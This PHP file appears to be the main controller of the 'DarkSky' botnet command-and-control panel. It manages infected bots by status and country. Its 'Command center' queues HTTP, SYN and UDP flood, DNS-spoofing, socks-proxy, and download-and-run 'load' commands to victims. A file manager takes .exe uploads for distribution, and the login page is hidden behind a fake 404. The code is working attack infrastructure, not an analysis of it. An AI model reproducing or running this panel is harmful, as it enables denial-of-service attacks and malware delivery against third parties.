<?

DEFINE('Other','modules/other/');
DEFINE('Config','modules/config/');
DEFINE('Modules','modules/');
DEFINE('Special','sky');

include_once(Other.'template.class.php');
include_once(Other.'filter.php');
include_once(Config.'config.php');
include_once(Modules.'global.php');
include_once(Modules.'security.php');
include_once(Modules.'users.php');
include_once(Modules.'html.php');
include_once('stat.php');


$global = new GlobalCore;
$user = new Admin;
$user->countinpage = $global->maxusers;
$tpl = new Template;
$tpl->dir = 'template/my/';
$filter = new Filter;
$sec = new Security('main');
$stat = new Stats('index');
$domain = parse_url($global->domain);
$tpl->set('{url}', $global->domain . $global->dir);
$tpl->set('{domain}', $global->domain);
date_default_timezone_set("Europe/Moscow");
$tpl->set('{time}', $user->GetTime(1));
$tpl->set('{show}', '');
$settings = false;

if($user->Check()){

	setcookie ('RepeatAuth',  '1' , time() + (3600*24));
	$pages = $user->countinpage;
	$maxbutt = ceil($user->CheckCountUsers()/10)*1;
	$tpl->set('{ip}', $user->UserInfos(0));
	$tpl->set('{code}', $user->UserInfos(1));
	$flag = '';

		if(isset($_GET['f'])){
		
				$tpl->set('{menu}', $tpl->sub_load_template('menu.tpl'));
				$tpl->set('{total_users}', $user->CheckCountUsers());
				$tpl->set('{total_online}', $user->GetOnline());
				$tpl->set('{total_offline}', $user->GetOffline());
				$tpl->set('{total_dead}', $user->GetDead());
				$tpl->set('{total_banned}', count(file($sec->ip_file))-3);
				$tpl->set('{url-menu}', $global->domain);
				$tpl->set('{url-menu}', $global->domain);
			
					if($_GET['f'] == 'main'){
					
						
						
						
						//==========================================================//
						$flag = $global->dir;
						$tpl->set('{main}', 'active');
						$tpl->set('{title}', $global->title);
						$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
						$tpl->set('{UsersDay}', $user->StatsFromDay());
						$tpl->set('{UsersMidOnline}', $user->StatsFromDayAOnline());
						$tpl->set('{UsersMidFileBanned}', count(file($sec->ip_file))-3);
						$tpl->set('{UsersDayBanned}', $user->StatsFromDayABanned());
						$tpl->set('{UsersDeath}', $user->StatsFromDayAOffline());
						//==========================================================//
						//if (isset($_GET['sort'])):
							
						//endif;
						//==========================================================//
						if(isset($_GET['p'])):
							$page = intval($_GET['p'])-1;
							$tpl->set('{active_button}', $page);
							$tpl->set('{max_users}', $user->CheckCountUsers($page));
							$tpl->set('{min_users}', $pages);
						else: 
							$page = 1;
							$tpl->set('{active_button}', $page+1);
							$tpl->set('{max_users}', $user->CheckCountUsers(0));
							$tpl->set('{min_users}', 10*$page);
						endif;
						//==========================================================//
						//создать список
						if(isset($_POST['create_list'])):
							if(isset($_POST['create_list'])):
								$global->AddToList($user->clear($_POST['listname']));
							endif;
						endif;
						//добавление ботов в списки
						if(isset($_POST['id']) && isset($_POST['values'])):
							$global->AddBotsToList($_POST['id'], $_POST['values']);
						endif;
						//переименовывание списка
						if(isset($_POST['id']) && isset($_POST['rename'])):
							$global->RenameList($_POST['id'], $_POST['rename']);
						endif;
						//удалить список
						if(isset($_GET['delete_list']) && isset($_GET['id'])):
							$global->DeleteList($_GET['id']);
							$user->GoHome(true);
						endif;
						//==========================================================//
						if(isset($_GET['action'])):
							if($_GET['action'] == 'delete' && isset($_GET['id'])):
								$user->DeleteUser($_GET['id']);
								$user->GoHome(true);
							endif;
							if(($_GET['action'] == 'banip') && isset($_GET['ip'])):
								$user->SetBotStatus($_GET['ip'], '3');
								if($sec->searchLine($_GET['ip'])==false):
									if($sec->AddToBase($_GET['ip'], 'Custom action')):
										$user->GoHome(true);
									endif;
								endif;
							endif;
							$user->GoHome(true);
						endif;
						//==========================================================//
					}
					if(isset($_GET['logdelete'])){
						if(strlen($_GET['logdelete'])>0){
							$user->DeleteLog($_GET['logdelete']);
							$user->GoHome(true);
						}
					}
					if($_GET['f'] == 'users'){
						$tpl->set('{users}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('users.tpl'));
						$tpl->set('{title}', 'The list of users' . $global->title);
					}
					if($_GET['f'] == 'crypt'){
						$tpl->set('{crypt}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('crypt.tpl'));
						$tpl->set('{title}', 'Crypt of utillity' .  $global->title);
					}
					if($_GET['f'] == 'ping'){
						$tpl->set('{ping}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('status.tpl'));
						$tpl->set('{title}', 'Check host status' . $global->title);
						$tpl->set('{ping-site}', '');
					}
					if($_GET['f'] == 'helpme'){
						$tpl->set('{helpme}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('help.tpl'));
						$tpl->set('{title}', 'Первая помощь' . $global->title);
					}
					if($_GET['f'] == 'manager'){
					
						$tpl->set('{manager}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('files.tpl'));
						$tpl->set('{title}', 'File Manager' .  $global->title);
						
						$allfiles = $global->LoadFiles();
						
						if(isset($_FILES['myfile'])):
							$destiation_dir = 'files/'.$_FILES['myfile']['name'];
							$info = pathinfo($destiation_dir);
					    	if ($info["extension"] == "exe"):
								move_uploaded_file($_FILES['myfile']['tmp_name'], $destiation_dir );
							endif;
							$user->GoHome(true);
						endif;
					
						if(isset($_GET['download'])):
							header('Location: files/'.$_GET['download']);
						endif;
						
						if(isset($_POST['action'])):	
							if(isset($_POST['action'])=='rename' && isset($_POST['oldname']) && isset($_POST['newname'])):
								$global->renameFile($_POST['oldname'], $_POST['newname']);
							endif;
							if(isset($_POST['action'])=='delete' && isset($_POST['file'])):
								$global->DeleteFile($_POST['file']);
							endif;
						endif;
						
					}
					if($_GET['f'] == 'product'){
						/* $uparr = json_decode($up->file_get_contents_curl(URL), true);*/
						$tpl->set('{product}', 'active');
						$tpl->set('{content}', $tpl->sub_load_template('software.tpl'));
						$tpl->set('{title}', 'DarkSky Software' . $global->title);
						//$tpl->set('{key}', KEY);
					//	$tpl->set('{current_version}', V);
					//	$tpl->set('{last_version}', $uparr[1]);
					//	$tpl->set('{last_date_update}', $uparr[3]);
					//	$tpl->set('{next_date_update}', $uparr[5]);
						//$tpl->set('{dump_link}', '../dump/1/'); 
					}
					if($_GET['f'] == 'settings'){
					$settings = true;
						if(isset($_GET['p'])):
						$tpl->set('{settings}', 'active');
						$settings = true;
							if($_GET['p'] == '1'):
									$tpl->set('{content}', $tpl->sub_load_template('settings1.tpl'));
									$tpl->set('{title}', 'Global settings' . $global->title);
									$tpl->set('{path}', $global->domain);
									$tpl->set('{domen}', $global->domain);
									$tpl->set('{template}', $global->dir);
									$tpl->set('{lang}', $global->lang);
									$tpl->set('{ht}', $global->ht); 
									$tpl->set('{move_list}', $global->move_list); 
									$tpl->set('{settings}', 'active');
									$tpl->set('{sets}', '0');
									
									if(isset($_POST['template']) && isset($_POST['domain']) && isset($_POST['lang']) && isset($_POST['chpu']) && isset($_POST['to_list'])):
										$global->UpdateConfig1($_POST['template'], $_POST['domain'], $_POST['lang'], $_POST['chpu'], $_POST['to_list']);
											$user->GoHome(true);
									endif;
							endif;
								
							if($_GET['p']=='2'):
									$tpl->set('{content}', $tpl->sub_load_template('settings2.tpl'));
									$tpl->set('{title}', 'Additional settings' . sep . $global->title);
									$tpl->set('{sets}', '1');
									$tpl->set('{viewcmd}', $global->showcmd); 
									$tpl->set('{autoclear}', $global->autoclear); 
									$tpl->set('{page}', $global->maxusers); 
									$tpl->set('{autoban}', $global->autoban);
									$tpl->set('{repeatban}', $global->repeatban);
									$tpl->set('{mode}', $global->mode);
									$tpl->set('{loginauth}', $global->access);
									if(isset($_POST['pages']) && isset($_POST['clear']) && isset($_POST['viewcmd']) && isset($_POST['autoban']) &&  isset($_POST['repeatban']) && isset($_POST['mode'])):
									$global->UpdateConfig2($_POST['clear'], $_POST['viewcmd'], $_POST['pages'], $_POST['mode'], $_POST['repeatban'], $_POST['autoban']);
											$user->GoHome(true);
									endif;
							endif;
						endif;
					}
					if($_GET['f'] == 'blacklist'){
							$tpl->set('{sec}', 'active');
							$tpl->set('{content}', $tpl->sub_load_template('blacklist.tpl'));
							$tpl->set('{title}', 'Black list'. $global->title);
							$tpl->set('{file}', $sec->LoadBase());
							if($sec->CheckBase() == true): $tpl->set('{seccode}', 'visible'); 
							else: $tpl->set('{seccode}', 'hidden'); endif;
							if(isset($_POST['ipblock']) || isset($_POST['ipunban'])):
								if(!(empty($_POST['ipblock']))): 
									$ipb = $_POST['ipblock'];
									if($sec->searchLine($ipb)==false):
										if($sec->AddToBase($ipb, 'Manual ban')):
											$user->GoHome(true);
											$tpl->set('{show}', '0');
										endif;
									else: 
										$tpl->set('{show}', '1');
									endif;
								endif;
								if(!(empty($_POST['ipunban']))):
									$unban = $_POST['ipunban'];
									if($sec->DeleteLine($sec->searchLine($unban))):
										$user->GoHome(true);
										$tpl->set('{show}', '0');
									else:
										$tpl->set('{show}', '1');
									endif;
								endif;
							endif;
					}
					if($_GET['f'] == 'commands'){
						
						$tpl->set('{commands}', 'active');
						$tpl->set('{title}', 'Command center'. $global->title);
						$tpl->set('{content}', $tpl->sub_load_template('users.tpl'));
					
						if(isset($_POST['comm']) && isset($_POST['amount']) && isset($_POST['url'])):
							
							
								if(isset($_POST['country'])): $con = $_POST['country']; else: $con = ''; endif;
								if(isset($_POST['forid'])): $forid = $_POST['forid']; else: $forid = ''; endif;
								if(isset($_POST['url'])): $url = $_POST['url']; else: $url = ''; endif;
								if(isset($_POST['thread'])) $thread = $_POST['thread'];
								if(isset($_POST['tcl_thread'])) $thread_tcp = $_POST['thread'];
								if(isset($_POST['timeout'])) $timeout = $_POST['timeout'];
								if(isset($_POST['method_http'])) $type = $_POST['method_http'];
								if(isset($_POST['amount'])): $amount = $_POST['amount'];  else: $amount = ''; endif;
								if(isset($_POST['forcat'])): $forcat = $_POST['forcat']; else: $forcat = ''; endif;
								
										if($_POST['comm'] == 'http_d'):
											if (strpos($url, 'https://') !== false):
												$http_protocol = 'https';
											else:
												$http_protocol = 'http';
											endif;
												$url = str_replace('https://', '', $url);
												$url = str_replace('http://', '', $url);
												$com = 'method.'.$http_protocol.':"' . $url  . '", threads:"' . $thread . '", timeout:"' . $timeout . '", type:"' . $type . '"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
										else:
											if($_POST['comm'] == 'delete'):
												$com = 'uninstall:"1"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat);
											endif;
											if($_POST['comm'] == 'socks'):
												$com = 'socks:"'.$url.'"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat);
											endif;
											if($_POST['comm'] == 'syn'):
												$com = 'syn:"' . $url  . '", p:"' . $thread_tcp . '", speed:"' . $timeout . '", thread:"'.$timeout.'"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
											if($_POST['comm'] == 'dns'):
												$url = str_replace('http://', '', $url);
												$com = 'dnsspoof.dns:"' . $url  . '", thread:"'.$thread.'", timeout:"' . $timeout . '"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
											if($_POST['comm'] == 'udp'):
												$com = $_POST['comm'] .':"'. $url . '", p:"'.$thread.'", speed:"'.$timeout.'"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
											if($_POST['comm'] == 'load'):
												$com = $_POST['comm'] .':"'. $url . '"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
											if($_POST['comm'] == 'sleep'):
												$com = $_POST['comm'] .':"'. $url . '"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
											if($_POST['comm'] == 'upd'):
												$com = $_POST['comm'] .':"'. $url . '"';
												$user->AddCommand($com, $amount, $con, $forid, $forcat); //1 commanda , 2 amount , 3 country, 4 for id
											endif;
										endif;
	
									$user->GoHome(true);
						endif;
						
						if(isset($_GET['delete_c'])):
							$user->ClearCommand($_GET['delete_c']);
							$user->GoHome(true);
						endif;
						
						if(isset($_GET['delete_l'])):
							if($user->ClearLastCMD()):
								$user->GoHome(true);
							endif;
						endif;
					}
					if($_GET['f'] == ''){
							$tpl->set('{title}', 'Error 404' . sep . $global->title);
							$tpl->set('{content}', $tpl->sub_load_template('error.tpl'));
							
					}
					if($_GET['f'] == 'login'){
							$tpl->set('{title}', 'Authorization on the website' . sep . $global->title);
							$tpl->set('{content}', $tpl->sub_load_template('login.tpl'));
						
					}
					
					
		} else {
			if(!empty($_GET['f'])){
				$tpl->set('{title}', $global->title);
				$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
				$tpl->set('{min_res}', count($user->UsersView($page))*1+($pages));
				$tpl->set('{low_res}', ($page*10));
				
			} else {
				
				$tpl->set('{content}', $tpl->sub_load_template('main-content.tpl'));
				$tpl->set('{main}', 'active');
			//	$tpl->set('{menu}', $tpl->sub_load_template('menu.tpl'));
			//	$tpl->set('{title}', $global->title);
			//	$tpl->set('{min_res}', count($user->UsersView($page))*1+($pages));
			//	$tpl->set('{low_res}', ($page*10));
				header('Location: main/');
				
			}
		}		
	if(isset($_GET['s'])=='1'){
		header('Location: ../main/');
	}
} else {
	if(isset($_GET['s'])=='1'){
		$tpl->set('{menu}', '');
		$tpl->set('{title}', 'Authorization on the website');
		$tpl->set('{login_url}', $global->domain);
		$tpl->set('{content}', $tpl->sub_load_template('login.tpl'));
		$main = true;
		
		
		
		if(isset($_POST['login']) == 'login'):
			if(isset($_POST['login']) && isset($_POST['password'])):
				if($user->CheckPassword($_POST['login'], $_POST['password']) == true):
						if(isset($_POST['form'])=='1'):
							
							header('Location: ../main/');
							
						endif;
					endif;
				endif;
			endif;
					
			
		
	} else {
		if(isset($_COOKIE['RepeatAuth'])=='1'):
			if(isset($_GET['f'])):
				header('Location: ../dark_sky_login/');
			else:
				header('Location: dark_sky_login/');
			endif;
		
		else:
			$sec->NotFound();
		endif;
	}
}

$tpl->set('{body}', '');
$tpl->load_template('main.tpl'); 

$tpl->compile('main');
eval(' ?' . '>' . $tpl->result['main'] . '<' . '?php ');
$tpl->global_clear();

?>